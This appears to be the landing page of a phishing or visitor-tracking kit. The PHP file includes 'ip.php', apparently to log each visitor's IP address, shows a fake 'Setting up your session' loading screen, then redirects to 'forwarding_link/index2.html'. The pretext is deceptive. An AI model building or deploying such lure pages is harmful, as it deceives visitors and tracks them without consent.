<?php
include 'ip.php';
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        .spinner {
            border: 8px solid #333;
            border-top: 8px solid #f3f3f3;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0%   { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h2>Loading, please wait...</h2>
    <p>Setting up your session...</p>
    <p id="statusMsg">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner"></div>
    </div>

    <script>
        window.onload = function() {
            setTimeout(function() {
                window.location.href = "forwarding_link/index2.html";
            }, 800);
        };
    </script>
</body>
</html>
';
exit;
?>
